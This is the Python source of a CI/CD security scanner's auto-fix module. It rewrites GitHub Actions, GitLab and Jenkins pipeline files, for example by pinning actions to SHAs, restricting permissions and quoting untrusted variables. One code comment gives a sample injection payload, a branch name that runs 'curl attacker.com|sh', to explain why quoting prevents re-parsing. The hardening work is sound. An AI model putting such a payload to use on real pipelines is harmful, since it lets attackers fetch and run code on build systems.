"""Auto-fix module for deterministic remediations.

Supports:
  --fix           Apply all safe auto-fixes in-place
  --fix-dry-run   Show what would be changed without modifying files

Level 1 (deterministic, safe to auto-apply):
  - Pin actions to SHA (resolves tag → SHA via git ls-remote)
  - Add persist-credentials: false to checkout steps
  - Add minimal permissions: block if missing

Level 2 (suggested, generates patch):
  - Replace script injection with env var pattern
  - Replace pull_request_target with pull_request (needs human review)
"""

from __future__ import annotations

import re
import subprocess
from dataclasses import dataclass

from .models import _quoted_heredoc_body_lines
from .reporters._encoding import em_dash_char, sep_char


@dataclass
class FixResult:
    file: str
    line: int
    original: str
    fixed: str
    fix_type: str
    applied: bool = False
    error: str = ""


# =============================================================================
# SHA Resolution Cache
# =============================================================================

_sha_cache: dict[str, str] = {}


def resolve_action_sha(action: str, ref: str) -> str | None:
    """Resolve an action@ref to a full commit SHA via git ls-remote.

    Returns the 40-char SHA or None if resolution fails.
    """
    cache_key = f"{action}@{ref}"
    if cache_key in _sha_cache:
        return _sha_cache[cache_key]

    url = f"https://github.com/{action}"
    try:
        # Arguments are fixed (`git`, `ls-remote`) and the URL/ref are
        # composed from rule-registry data, not user input. `git` is
        # intentionally resolved via PATH so operator tooling like
        # `direnv`, Homebrew, or custom `/opt/git/bin` wins over a stale
        # system copy; locking to a full path would break common dev
        # setups and doesn't raise the security bar here.
        result = subprocess.run(  # nosec B603 B607
            ["git", "ls-remote", url, ref, f"refs/tags/{ref}", f"refs/heads/{ref}"],
            capture_output=True,
            text=True,
            timeout=15,
        )
        if result.returncode != 0:
            return None

        for line in result.stdout.strip().splitlines():
            sha = line.split()[0]
            if len(sha) == 40 and all(c in "0123456789abcdef" for c in sha):
                _sha_cache[cache_key] = sha
                return sha
    except (subprocess.TimeoutExpired, FileNotFoundError, Exception):
        return None

    return None


# =============================================================================
# Fix: Pin Actions to SHA
# =============================================================================

_uses_pattern = re.compile(r"^(\s*-?\s*uses:\s*)([^@\s]+)@(?!([a-f0-9]{40}))(\S+)(.*)$")


def fix_pin_actions(filepath: str, dry_run: bool = False) -> list[FixResult]:
    """Pin all unpinned action references to their commit SHAs."""
    results = []

    with open(filepath, encoding="utf-8") as f:
        lines = f.readlines()

    modified = False
    new_lines = []

    for i, line in enumerate(lines):
        match = _uses_pattern.match(line)
        if match:
            prefix = match.group(1)
            action = match.group(2)
            ref = match.group(4)
            suffix = match.group(5) or ""

            # Skip local actions and docker://
            if action.startswith("./") or action.startswith("docker://"):
                new_lines.append(line)
                continue

            sha = resolve_action_sha(action, ref)
            if sha:
                # Strip existing inline comment about version if present
                clean_suffix = re.sub(r"\s*#\s*v[\d.]+\s*$", "", suffix).rstrip()
                fixed_line = f"{prefix}{action}@{sha} # {ref}{clean_suffix}\n"
                results.append(
                    FixResult(
                        file=filepath,
                        line=i + 1,
                        original=line.rstrip(),
                        fixed=fixed_line.rstrip(),
                        fix_type="pin_sha",
                        applied=not dry_run,
                    )
                )
                new_lines.append(fixed_line)
                modified = True
            else:
                results.append(
                    FixResult(
                        file=filepath,
                        line=i + 1,
                        original=line.rstrip(),
                        fixed="",
                        fix_type="pin_sha",
                        applied=False,
                        error=f"Could not resolve SHA for {action}@{ref}",
                    )
                )
                new_lines.append(line)
        else:
            new_lines.append(line)

    if modified and not dry_run:
        with open(filepath, "w", encoding="utf-8") as f:
            f.writelines(new_lines)

    return results


# =============================================================================
# Fix: Add persist-credentials: false
# =============================================================================

_checkout_pattern = re.compile(r"^(\s*)-?\s*uses:\s*actions/checkout@")


def fix_persist_credentials(filepath: str, dry_run: bool = False) -> list[FixResult]:
    """Add persist-credentials: false to checkout steps that don't have it."""
    results = []

    with open(filepath, encoding="utf-8") as f:
        lines = f.readlines()

    modified = False
    new_lines = []
    i = 0

    while i < len(lines):
        line = lines[i]
        match = _checkout_pattern.match(line)

        if match:
            indent = match.group(1)
            # Look ahead for 'with:' and 'persist-credentials'
            window_end = min(i + 10, len(lines))
            window = "".join(lines[i:window_end])

            if "persist-credentials: false" in window:
                new_lines.append(line)
                i += 1
                continue

            # Check if 'with:' block exists
            has_with = False
            with_line_idx = -1
            for j in range(i + 1, window_end):
                stripped = lines[j].strip()
                if stripped.startswith("with:"):
                    has_with = True
                    with_line_idx = j
                    break
                if stripped.startswith("-") or (
                    stripped and ":" in stripped and not stripped.startswith("#")
                ):
                    break

            if has_with:
                # Insert persist-credentials: false after 'with:'
                new_lines.append(line)
                i += 1
                # Copy lines until we hit 'with:'
                while i <= with_line_idx:
                    new_lines.append(lines[i])
                    i += 1
                # Determine indentation for the new line. The regex
                # `^(\s*)` always matches (zero-width at minimum) so
                # the match object is never None, but mypy can't prove
                # that without an explicit assertion.
                indent_match = re.match(r"^(\s*)", lines[with_line_idx])
                # The `^(\s*)` regex always matches (zero-width ok) —
                # narrows Optional[Match] → Match for mypy.
                assert indent_match is not None  # nosec B101
                with_indent = indent_match.group(1)
                insert_line = f"{with_indent}  persist-credentials: false\n"
                new_lines.append(insert_line)
                results.append(
                    FixResult(
                        file=filepath,
                        line=with_line_idx + 2,
                        original="(missing)",
                        fixed=insert_line.rstrip(),
                        fix_type="persist_credentials",
                        applied=not dry_run,
                    )
                )
                modified = True
            else:
                # Add 'with:' block with persist-credentials
                new_lines.append(line)
                step_indent = indent + "  " if line.strip().startswith("-") else indent
                with_block = f"{step_indent}  with:\n{step_indent}    persist-credentials: false\n"
                new_lines.append(with_block)
                results.append(
                    FixResult(
                        file=filepath,
                        line=i + 2,
                        original="(no with: block)",
                        fixed=with_block.rstrip(),
                        fix_type="persist_credentials",
                        applied=not dry_run,
                    )
                )
                modified = True
                i += 1
        else:
            new_lines.append(line)
            i += 1

    if modified and not dry_run:
        with open(filepath, "w", encoding="utf-8") as f:
            f.writelines(new_lines)

    return results


# =============================================================================
# Fix: Add permissions block
# =============================================================================


def fix_add_permissions(filepath: str, dry_run: bool = False) -> list[FixResult]:
    """Add a minimal permissions block if none exists."""
    results: list[FixResult] = []

    with open(filepath, encoding="utf-8") as f:
        content = f.read()

    if re.search(r"^permissions:", content, re.MULTILINE):
        return results  # Already has permissions

    lines = content.splitlines(keepends=True)

    # Find the 'on:' line and insert permissions after it
    insert_idx = None
    for i, line in enumerate(lines):
        if re.match(r"^on:", line) or re.match(r"^on\s*$", line):
            # Find end of the 'on:' block
            for j in range(i + 1, len(lines)):
                if (
                    lines[j].strip()
                    and not lines[j].startswith(" ")
                    and not lines[j].startswith("\t")
                ):
                    insert_idx = j
                    break
            if insert_idx is None:
                insert_idx = len(lines)
            break

    if insert_idx is None:
        # No 'on:' found — insert after name: line or at top
        for i, line in enumerate(lines):
            if re.match(r"^name:", line):
                insert_idx = i + 1
                break
        if insert_idx is None:
            insert_idx = 0

    permissions_block = "\npermissions:\n  contents: read\n\n"
    lines.insert(insert_idx, permissions_block)

    results.append(
        FixResult(
            file=filepath,
            line=insert_idx + 1,
            original="(no permissions block)",
            fixed="permissions:\n  contents: read",
            fix_type="add_permissions",
            applied=not dry_run,
        )
    )

    if not dry_run:
        with open(filepath, "w", encoding="utf-8") as f:
            f.writelines(lines)

    return results


# =============================================================================
# Fix: add --ignore-scripts to npm/yarn/pnpm install (OPT-IN)
# =============================================================================

# Matches explicit install commands that execute lifecycle hooks by default.
# Does NOT match `npm run`, `npm test`, `yarn` bare, etc. — those interact
# with user-defined scripts by design and would be surprising to rewrite.
_NPM_IGNORE_SCRIPTS_CMD = re.compile(
    r"\b(?:npm\s+(?:install|ci|i)|pnpm\s+(?:install|i)|yarn\s+install)\b"
)


def fix_npm_ignore_scripts(filepath: str, dry_run: bool = False) -> list[FixResult]:
    """Insert ``--ignore-scripts`` into every npm/yarn/pnpm install command.

    OPT-IN fix: this changes build semantics.  Packages whose legitimate
    workflow relies on ``postinstall`` hooks (husky, electron-builder, some
    native-addon builds) will stop working without manual reconfiguration.
    Users must explicitly enable this via ``--fix-npm-ignore-scripts``; it
    is not part of the default ``--fix`` safe set.
    """
    results: list[FixResult] = []
    with open(filepath, encoding="utf-8") as f:
        content = f.read()

    new_lines: list[str] = []
    modified = False
    for i, line in enumerate(content.splitlines(keepends=True)):
        if "--ignore-scripts" in line:
            # Already mitigated somewhere on this line — don't double-add.
            new_lines.append(line)
            continue

        m = _NPM_IGNORE_SCRIPTS_CMD.search(line)
        if m is None:
            new_lines.append(line)
            continue

        # Insert the flag directly after the matched command. npm, yarn, and
        # pnpm all accept flags anywhere on the command line, so inserting
        # here is safe whether or not additional package names follow.
        new_line = line[: m.end()] + " --ignore-scripts" + line[m.end() :]
        new_lines.append(new_line)
        results.append(
            FixResult(
                file=filepath,
                line=i + 1,
                original=line.rstrip(),
                fixed=new_line.rstrip(),
                fix_type="npm_ignore_scripts",
                applied=not dry_run,
            )
        )
        modified = True

    if modified and not dry_run:
        with open(filepath, "w", encoding="utf-8") as f:
            f.writelines(new_lines)

    return results


# =============================================================================
# Fix: remove ACTIONS_ALLOW_UNSECURE_COMMANDS re-enabling (SEC4-GH-009)
# =============================================================================

# GitHub deprecated ::set-env:: / ::add-path:: workflow commands in 2020
# precisely because any stdout-writing step could inject env vars or PATH
# entries. Per the rule description: "There is no legitimate reason to
# re-enable this." Deleting the whole env-var line is always correct —
# removing the toggle restores the safe GitHub default, which cannot
# break a workflow that was relying on the deprecated commands (those
# commands are genuinely gone; the flag just flips an override).
_ACTIONS_UNSECURE_CMDS = re.compile(
    r"^(?P<indent>\s*)ACTIONS_ALLOW_UNSECURE_COMMANDS\s*:\s*"
    r"(?i:true|yes|on|y|1|'true'|\"true\"|'yes'|\"yes\"|'on'|\"on\"|'1'|\"1\")\s*"
    r"(?:#.*)?$"
)


def fix_remove_insecure_commands(filepath: str, dry_run: bool = False) -> list[FixResult]:
    """Delete any `ACTIONS_ALLOW_UNSECURE_COMMANDS: true` line.

    The env var is a per-step override that re-enables the deprecated
    `::set-env::` / `::add-path::` workflow commands. Removing the line
    restores the safe default; it cannot break a legitimate workflow
    because the deprecated commands no longer exist upstream.
    """
    results: list[FixResult] = []
    with open(filepath, encoding="utf-8") as f:
        content = f.read()

    lines = content.splitlines(keepends=True)
    new_lines: list[str] = []
    modified = False
    for i, line in enumerate(lines):
        if _ACTIONS_UNSECURE_CMDS.match(line):
            results.append(
                FixResult(
                    file=filepath,
                    line=i + 1,
                    original=line.rstrip(),
                    fixed="(line removed)",
                    fix_type="remove_insecure_commands",
                    applied=not dry_run,
                )
            )
            modified = True
            continue
        new_lines.append(line)

    if modified and not dry_run:
        with open(filepath, "w", encoding="utf-8") as f:
            f.writelines(new_lines)

    return results


# =============================================================================
# Fix: remove ACTIONS_STEP_DEBUG / ACTIONS_RUNNER_DEBUG toggles (SEC10-GH-003)
# =============================================================================

# These toggles cause the runner to echo every `##[debug]` trace, which
# includes masked-secret expansion attempts. Enabling them in a persistent
# workflow config (rather than per-rerun via the GitHub UI) exposes
# secrets in logs on every run. Removing the line reverts to the safe
# default; operators who need debug output can still set these as
# workflow-run inputs from the Actions UI on demand.
_DEBUG_LOG_TOGGLE = re.compile(
    r"^(?P<indent>\s*)(ACTIONS_STEP_DEBUG|ACTIONS_RUNNER_DEBUG)\s*:\s*"
    r"(?i:true|'true'|\"true\"|1|'1'|\"1\")\s*"
    r"(?:#.*)?$"
)


def fix_remove_debug_logging(filepath: str, dry_run: bool = False) -> list[FixResult]:
    """Delete persistent ACTIONS_STEP_DEBUG / ACTIONS_RUNNER_DEBUG=true lines.

    Reverts to the GitHub default (debug off). Debug logging can still be
    enabled per-run via the Re-run job UI or the workflow-dispatch input;
    the persistent env-var form is what exposes masked-secret expansion
    attempts in every log.
    """
    results: list[FixResult] = []
    with open(filepath, encoding="utf-8") as f:
        content = f.read()

    lines = content.splitlines(keepends=True)
    new_lines: list[str] = []
    modified = False
    for i, line in enumerate(lines):
        if _DEBUG_LOG_TOGGLE.match(line):
            results.append(
                FixResult(
                    file=filepath,
                    line=i + 1,
                    original=line.rstrip(),
                    fixed="(line removed)",
                    fix_type="remove_debug_logging",
                    applied=not dry_run,
                )
            )
            modified = True
            continue
        new_lines.append(line)

    if modified and not dry_run:
        with open(filepath, "w", encoding="utf-8") as f:
            f.writelines(new_lines)

    return results


# =============================================================================
# Fix: disable opt-in setup-<lang> cache in release/tag workflows (SEC9-GH-003)
# =============================================================================

# Matches a `cache: <value>` line where value is NOT already `false`. We
# only rewrite in files where the SEC9-GH-003 trigger gate (on: release,
# on: push/tags with a real pattern, or on: [..., release, ...]) is
# present; the gate is reproduced here so the fixer doesn't touch
# cache: npm lines in non-release workflows where the rule doesn't fire.
_CACHE_LINE = re.compile(
    r"^(?P<indent>[ \t]+)cache:[ \t]*(?P<value>(?!false\b|['\"]false['\"])[^\s#][^\n#]*?)"
    r"(?P<trailing>[ \t]*(?:#.*)?)$"
)
_SEC9_GH_003_TRIGGER_GATE = re.compile(
    r"(?:"
    # Direct on: release: at 1-4 space indent
    r"(?:\A|\n)on:[^\n]*\n(?:[^\n]*\n){0,30}?[ ]{1,4}release:[ \t\n]"
    r"|"
    # on: push: with real tags: pattern
    r"(?:\A|\n)on:[^\n]*\n(?:[^\n]*\n){0,30}?[ ]{1,4}push:[^\n]*\n"
    r"(?:[^\n]*\n){0,20}?[ ]{2,8}tags:[ \t]*"
    r"(?:\[[ \t]*(?!['\"]?!)[^\]\s]|\n[ ]+-[ \t]+(?!['\"]?!)\S)"
    r"|"
    # List form on: [..., release, ...]
    r"\bon:[ \t]*\[[^\]]*\brelease\b[^\]]*\]"
    r")"
)
_SETUP_X_ACTION = re.compile(r"uses:\s*actions/setup-(?:python|node|java|dotnet|ruby)@")


def fix_disable_setup_cache_in_release(filepath: str, dry_run: bool = False) -> list[FixResult]:
    """Rewrite `cache: <lang>` to `cache: false` under setup-X in release workflows.

    SEC9-GH-003's remediation recommends `cache: false` as the safest
    posture for release/tag workflows. Disabling the cache never breaks
    a build — it just trades a slower install for immunity to cache
    poisoning. If a team genuinely needs the cache on release (e.g.
    they're shipping many releases per day), they can revert the
    edit; the fix is the recommended default for the non-hot-release
    case.
    """
    results: list[FixResult] = []
    with open(filepath, encoding="utf-8") as f:
        content = f.read()

    # Only rewrite in files that actually satisfy SEC9-GH-003's trigger
    # gate AND use a setup-<lang> action; otherwise we'd overwrite
    # `cache: npm` in unrelated workflows where the rule doesn't fire.
    if not _SEC9_GH_003_TRIGGER_GATE.search(content):
        return results
    if not _SETUP_X_ACTION.search(content):
        return results

    lines = content.splitlines(keepends=True)
    new_lines: list[str] = []
    modified = False
    for i, line in enumerate(lines):
        m = _CACHE_LINE.match(line)
        if m is None:
            new_lines.append(line)
            continue
        # Preserve indent + trailing comment; replace the value with `false`.
        new_line = f"{m.group('indent')}cache: false{m.group('trailing')}"
        # Preserve line ending
        if line.endswith("\r\n"):
            new_line += "\r\n"
        elif line.endswith("\n"):
            new_line += "\n"
        new_lines.append(new_line)
        results.append(
            FixResult(
                file=filepath,
                line=i + 1,
                original=line.rstrip(),
                fixed=new_line.rstrip(),
                fix_type="disable_setup_cache_in_release",
                applied=not dry_run,
            )
        )
        modified = True

    if modified and not dry_run:
        with open(filepath, "w", encoding="utf-8") as f:
            f.writelines(new_lines)

    return results


# =============================================================================
# Fix: quote the variable — $VAR → "$VAR" for attacker-controllable CI vars
# =============================================================================
#
# All three quote-the-variable fixers share the same shape: a regex finds an
# unquoted `$VAR` reference in a shell context and wraps it in double quotes.
# Double-quoting bounds word-splitting (POSIX sh §2.6.5) without changing the
# expanded value, so a branch name like `feature/$(curl attacker.com|sh)`
# arrives at the downstream tool as a literal string instead of being re-parsed
# as shell source.  Single-quoted `'$VAR'` would be safer still but changes
# meaning (literal `$VAR`), so we only quote with `"..."`.


def _quote_ci_var_line(
    line: str,
    var_re: re.Pattern[str],
    skip_line_res: tuple[re.Pattern[str], ...],
) -> str | None:
    """Rewrite a single-line shell command so every matched CI var is
    wrapped in double quotes.

    Returns the rewritten line, or ``None`` if the line was skipped
    (commented, YAML key-value, already quoted, `if:` expression, etc.)
    or contains no match.
    """
    if any(r.search(line) for r in skip_line_res):
        return None
    if not var_re.search(line):
        return None

    # Only quote instances that are genuinely unquoted in shell.  Walk the
    # line left-to-right tracking the enclosing quote (if any); skip
    # occurrences already inside a quoted region.
    out: list[str] = []
    i = 0
    in_quote: str | None = None
    rewrote = False
    while i < len(line):
        ch = line[i]
        if in_quote is None and ch in ("'", '"'):
            in_quote = ch
            out.append(ch)
            i += 1
            continue
        if in_quote is not None and ch == in_quote:
            in_quote = None
            out.append(ch)
            i += 1
            continue
        if in_quote is None:
            m = var_re.match(line, i)
            if m is not None:
                out.append('"')
                out.append(m.group(0))
                out.append('"')
                i = m.end()
                rewrote = True
                continue
        out.append(ch)
        i += 1

    if not rewrote:
        return None
    return "".join(out)


# -----------------------------------------------------------------------------
# SEC4-GH-018 — quote $GITHUB_REF_NAME / $GITHUB_HEAD_REF / ...
# -----------------------------------------------------------------------------

_GITHUB_REF_VARS = (
    "GITHUB_REF_NAME",
    "GITHUB_HEAD_REF",
    "GITHUB_BASE_REF",
    "GITHUB_ACTOR",
    "GITHUB_REPOSITORY_OWNER",
    "GITHUB_REPOSITORY",
    "GITHUB_WORKFLOW",
    "GITHUB_JOB",
)
_GITHUB_REF_VAR_RE = re.compile(r"\$\{?(?:" + "|".join(_GITHUB_REF_VARS) + r")\}?")
# Skip rules mirror SEC4-GH-018's exclude list in sec4_ppe_extended.py.
_GITHUB_REF_SKIP_RES = (
    re.compile(r"^\s*#"),
    re.compile(r"^\s*[\w_]+:\s*\$\{?GITHUB_"),
    re.compile(r"^\s*-?\s*if:"),
)


def fix_quote_github_refs(filepath: str, dry_run: bool = False) -> list[FixResult]:
    """Wrap unquoted ``$GITHUB_REF_NAME`` / ``$GITHUB_HEAD_REF`` / related
    auto-populated GitHub env vars in double quotes inside shell commands.

    Bounds word-splitting without changing the expanded value — safe to apply
    mechanically.  Skips heredoc bodies with quoted markers, YAML key-value
    assignments, ``if:`` expressions, and references already inside quotes.
    Pairs with rule SEC4-GH-018.
    """
    results: list[FixResult] = []
    with open(filepath, encoding="utf-8") as f:
        lines = f.readlines()

    heredoc_skip = _quoted_heredoc_body_lines(lines)
    new_lines: list[str] = []
    modified = False
    for i, line in enumerate(lines):
        if i in heredoc_skip:
            new_lines.append(line)
            continue
        rewritten = _quote_ci_var_line(line, _GITHUB_REF_VAR_RE, _GITHUB_REF_SKIP_RES)
        if rewritten is None:
            new_lines.append(line)
            continue
        new_lines.append(rewritten)
        results.append(
            FixResult(
                file=filepath,
                line=i + 1,
                original=line.rstrip(),
                fixed=rewritten.rstrip(),
                fix_type="quote_github_refs",
                applied=not dry_run,
            )
        )
        modified = True

    if modified and not dry_run:
        with open(filepath, "w", encoding="utf-8") as f:
            f.writelines(new_lines)

    return results


# -----------------------------------------------------------------------------
# SEC4-GL-003 — quote $CI_COMMIT_REF_NAME / $CI_COMMIT_TAG / $CI_BUILD_REF_NAME
# -----------------------------------------------------------------------------

_GITLAB_REF_VARS = (
    "CI_COMMIT_REF_NAME",
    "CI_COMMIT_TAG",
    "CI_BUILD_REF_NAME",
)
_GITLAB_REF_VAR_RE = re.compile(r"\$\{?(?:" + "|".join(_GITLAB_REF_VARS) + r")\}?")
# Skip rules mirror SEC4-GL-003's exclude list in gitlab/sec1_sec4_sec6_sec7_sec9.py.
# Does NOT include CI_MERGE_REQUEST_SOURCE_BRANCH_SHA — 40-char hex SHAs can't
# carry shell metacharacters, so unquoted usage is safe (dropped in PR #65).
_GITLAB_REF_SKIP_RES = (
    re.compile(r"^\s*#"),
    re.compile(r"^\s*[\w_]+:\s*\$\{?CI_"),
    re.compile(r"^\s*-?\s*if:"),
    # Bash `[[ ... ]]` conditional — word splitting disabled per Bash §3.2.5.2,
    # so the variable is safe even unquoted. Skip to preserve the author's form.
    re.compile(r"\[\[[^\n]*\$\{?(?:" + "|".join(_GITLAB_REF_VARS) + r")\}?[^\n]*\]\]"),
)


def fix_quote_gitlab_refs(filepath: str, dry_run: bool = False) -> list[FixResult]:
    """Wrap unquoted ``$CI_COMMIT_REF_NAME`` / ``$CI_COMMIT_TAG`` /
    ``$CI_BUILD_REF_NAME`` in double quotes inside shell commands.

    Bounds word-splitting without changing the expanded value — safe to apply
    mechanically.  Skips heredoc bodies, YAML key-value assignments, ``rules:if:``
    expressions, Bash ``[[ ... ]]`` conditionals, and references already inside
    quotes.  Pairs with rule SEC4-GL-003.
    """
    results: list[FixResult] = []
    with open(filepath, encoding="utf-8") as f:
        lines = f.readlines()

    heredoc_skip = _quoted_heredoc_body_lines(lines)
    new_lines: list[str] = []
    modified = False
    for i, line in enumerate(lines):
        if i in heredoc_skip:
            new_lines.append(line)
            continue
        rewritten = _quote_ci_var_line(line, _GITLAB_REF_VAR_RE, _GITLAB_REF_SKIP_RES)
        if rewritten is None:
            new_lines.append(line)
            continue
        new_lines.append(rewritten)
        results.append(
            FixResult(
                file=filepath,
                line=i + 1,
                original=line.rstrip(),
                fixed=rewritten.rstrip(),
                fix_type="quote_gitlab_refs",
                applied=not dry_run,
            )
        )
        modified = True

    if modified and not dry_run:
        with open(filepath, "w", encoding="utf-8") as f:
            f.writelines(new_lines)

    return results


# -----------------------------------------------------------------------------
# SEC4-GL-001 — quote $CI_COMMIT_MESSAGE / $CI_MERGE_REQUEST_TITLE / ...
# -----------------------------------------------------------------------------

_GITLAB_CI_VARS = (
    "CI_COMMIT_MESSAGE",
    "CI_MERGE_REQUEST_TITLE",
    "CI_MERGE_REQUEST_DESCRIPTION",
    "CI_COMMIT_BRANCH",
    "CI_MERGE_REQUEST_SOURCE_BRANCH_NAME",
)
_GITLAB_CI_VAR_RE = re.compile(r"\$\{?(?:" + "|".join(_GITLAB_CI_VARS) + r")\}?")
# Skip rules mirror SEC4-GL-001's exclude list in
# gitlab/sec1_sec4_sec6_sec7_sec9.py.  All five vars are user-controlled
# (commit messages, MR titles/descriptions, branch names) and can carry
# shell metacharacters when interpolated unquoted.
_GITLAB_CI_SKIP_RES = (
    re.compile(r"^\s*#"),
    re.compile(r"^\s*[\w_]+:\s*\$\{?CI_"),
    re.compile(r"^\s*-?\s*if:"),
    # Bash `[[ ... ]]` — word splitting disabled per Bash §3.2.5.2, safe
    # even unquoted.  Mirror SEC4-GL-003's same exclude.
    re.compile(r"\[\[[^\n]*\$\{?(?:" + "|".join(_GITLAB_CI_VARS) + r")\}?[^\n]*\]\]"),
)


def fix_quote_gitlab_ci_vars(filepath: str, dry_run: bool = False) -> list[FixResult]:
    """Wrap unquoted ``$CI_COMMIT_MESSAGE`` / ``$CI_MERGE_REQUEST_TITLE`` /
    ``$CI_MERGE_REQUEST_DESCRIPTION`` / ``$CI_COMMIT_BRANCH`` /
    ``$CI_MERGE_REQUEST_SOURCE_BRANCH_NAME`` in double quotes inside shell
    commands.

    Bounds word-splitting without changing the expanded value — safe to
    apply mechanically.  Skips heredoc bodies, YAML key-value assignments,
    ``rules:if:`` expressions, Bash ``[[ ... ]]`` conditionals, and
    references already inside quotes.  Pairs with rule SEC4-GL-001
    (the GitLab analogue of SEC4-GH-018, where the variable list is the
    payload-bearing user-input vars rather than ref/tag identifiers).
    """
    results: list[FixResult] = []
    with open(filepath, encoding="utf-8") as f:
        lines = f.readlines()

    heredoc_skip = _quoted_heredoc_body_lines(lines)
    new_lines: list[str] = []
    modified = False
    for i, line in enumerate(lines):
        if i in heredoc_skip:
            new_lines.append(line)
            continue
        rewritten = _quote_ci_var_line(line, _GITLAB_CI_VAR_RE, _GITLAB_CI_SKIP_RES)
        if rewritten is None:
            new_lines.append(line)
            continue
        new_lines.append(rewritten)
        results.append(
            FixResult(
                file=filepath,
                line=i + 1,
                original=line.rstrip(),
                fixed=rewritten.rstrip(),
                fix_type="quote_gitlab_ci_vars",
                applied=not dry_run,
            )
        )
        modified = True

    if modified and not dry_run:
        with open(filepath, "w", encoding="utf-8") as f:
            f.writelines(new_lines)

    return results


# -----------------------------------------------------------------------------
# SEC4-JK-001 — rewrite sh "cmd ${params.X}" → sh 'cmd ${params.X}'
# -----------------------------------------------------------------------------
#
# A double-quoted Groovy string (GString) interpolates ${params.X} BEFORE the
# `sh` step runs, so attacker-controlled metacharacters land in the command
# literal.  A single-quoted Groovy string leaves `${params.X}` alone; the shell
# never sees an expanded value at all.  That alone doesn't make the shell
# invocation safe (the shell still has to handle the value through an env var),
# but it removes the Groovy-level injection primitive and is strictly safer
# than the starting state.  The rule's remediation still points to the full
# `withEnv + single-quoted body + case allowlist` pattern in the guide.

# Match `sh "..."` (single double-quote form) where the body contains at least
# one `${params.X}` or `${env.X}` reference. Triple-double-quoted form
# (`sh """..."""`) and multi-line forms are NOT handled — they're rarer and
# mechanical rewriting risks breaking legitimate multi-line scripts.
_JK_GSTRING_INTERPOLATED = re.compile(
    r"""^(?P<prefix>\s*sh\s+)"(?P<body>[^"\n]*\$\{?\s*(?:params|env)\s*\.[^"\n]*)"(?P<suffix>\s*)$"""
)


def fix_unquote_groovy_gstring_with_params(filepath: str, dry_run: bool = False) -> list[FixResult]:
    """Rewrite ``sh "cmd ${params.X}"`` → ``sh 'cmd ${params.X}'``.

    Only fires on single-line ``sh`` steps whose GString body references a
    ``params.*`` or ``env.*`` value — the attacker-controlled shapes flagged
    by SEC4-JK-001 and SEC4-JK-002.  Triple-quoted and multi-line forms are
    left alone; use the guide for those.  Skips bodies that already contain
    a single quote (which would require escaping).
    """
    results: list[FixResult] = []
    with open(filepath, encoding="utf-8") as f:
        lines = f.readlines()

    new_lines: list[str] = []
    modified = False
    for i, line in enumerate(lines):
        stripped = line.lstrip()
        if stripped.startswith("//"):
            new_lines.append(line)
            continue
        m = _JK_GSTRING_INTERPOLATED.match(line.rstrip("\n"))
        if m is None:
            new_lines.append(line)
            continue
        body = m.group("body")
        # Can't safely single-quote a body that already contains a single
        # quote — Groovy has no \' escape inside '...', so rewriting would
        # require splitting and concatenating.  Skip; the guide covers it.
        if "'" in body:
            new_lines.append(line)
            continue
        # If the body ALSO carries a non-params/env interpolation (e.g.
        # ${BUILD_ID}, ${someGroovyVar}), single-quoting would silently
        # change its meaning — Groovy would stop interpolating it.  Leave
        # such lines to the guide.
        non_param_interp = re.search(r"\$\{?(?!\s*(?:params|env)\s*\.)[A-Za-z_]", body)
        if non_param_interp is not None:
            new_lines.append(line)
            continue
        trailing_newline = "\n" if line.endswith("\n") else ""
        fixed_line = f"{m.group('prefix')}'{body}'{m.group('suffix')}{trailing_newline}"
        new_lines.append(fixed_line)
        results.append(
            FixResult(
                file=filepath,
                line=i + 1,
                original=line.rstrip(),
                fixed=fixed_line.rstrip(),
                fix_type="unquote_groovy_gstring_with_params",
                applied=not dry_run,
            )
        )
        modified = True

    if modified and not dry_run:
        with open(filepath, "w", encoding="utf-8") as f:
            f.writelines(new_lines)

    return results


# =============================================================================
# Opt-in fix: comment-hint alternative to --privileged (SEC8-JK-004)
# =============================================================================
#
# Inserts a Groovy ``// taintly hint: ...`` comment above each line
# that uses ``--privileged`` on a Jenkinsfile ``args`` / ``.inside()`` /
# ``.withRun()`` / shell-level ``docker run``.  The source line is left
# unchanged — comment-only injection is zero semantic change, but also
# not a "fix" in the strong sense: the review-needed decision about
# what cap-add the build actually needs stays with the human.  Offered
# as opt-in so users who want a review-reminder in diff form can get
# one.
_JK_PRIVILEGED_LINE = re.compile(
    r"(?:"
    r"\bargs\s+['\"][^'\"]*--privileged\b"
    r"|\.(?:inside|withRun)\s*\(\s*['\"][^'\"]*--privileged\b"
    r"|\bdocker\s+run\b[^\n]*--privileged\b"
    r")"
)

_JK_CAP_ADD_HINT = (
    "// taintly hint (SEC8-JK-004): consider `--cap-add=<NAME>` "
    "instead of `--privileged` — only the specific capability the "
    "build actually needs.  Remove this comment once reviewed."
)


def fix_jenkins_cap_add_hint(filepath: str, dry_run: bool = False) -> list[FixResult]:
    """Inject a Groovy comment above each ``--privileged`` line on a
    Jenkinsfile pointing at ``--cap-add=<NAME>`` as the narrower
    alternative.  OPT-IN because it decorates the file with review-
    reminder comments; users who rename privileged in CI review flows
    rarely want the comments back."""
    results: list[FixResult] = []
    # Don't run on non-Jenkinsfile paths.  Accept any file whose basename
    # starts with ``Jenkinsfile`` (covers ``Jenkinsfile``,
    # ``Jenkinsfile.coverage``, etc.) or ends with ``.groovy`` under a
    # ``jenkins/`` directory.
    from os.path import basename, dirname

    name = basename(filepath)
    # Normalise to forward slashes BEFORE splitting; ``os.path.dirname``
    # produces ``\``-separated segments on Windows, and a literal
    # ``.split("/")`` would return the whole path as one element there
    # — silently misclassifying every Jenkins ``.groovy`` file under a
    # ``jenkins\`` directory as non-Jenkins.  Same fix family as the
    # XF-GH-003 / XF-GH-004 endswith bugs.
    is_jk = name.startswith("Jenkinsfile") or (
        name.endswith(".groovy") and "jenkins" in dirname(filepath).replace("\\", "/").split("/")
    )
    if not is_jk:
        return results

    with open(filepath, encoding="utf-8") as f:
        lines = f.readlines()

    new_lines: list[str] = []
    modified = False
    for i, line in enumerate(lines):
        # Don't re-inject if the hint is already present on the line above.
        prev = new_lines[-1] if new_lines else ""
        if _JK_PRIVILEGED_LINE.search(line) and "taintly hint (SEC8-JK-004)" not in prev:
            # Preserve the source line's leading indent for the comment.
            indent = line[: len(line) - len(line.lstrip())]
            new_lines.append(f"{indent}{_JK_CAP_ADD_HINT}\n")
            new_lines.append(line)
            results.append(
                FixResult(
                    file=filepath,
                    line=i + 1,
                    original=line.rstrip(),
                    fixed=f"{indent}{_JK_CAP_ADD_HINT}\n{line.rstrip()}",
                    fix_type="jenkins_cap_add_hint",
                    applied=not dry_run,
                )
            )
            modified = True
        else:
            new_lines.append(line)

    if modified and not dry_run:
        with open(filepath, "w", encoding="utf-8") as f:
            f.writelines(new_lines)
    return results


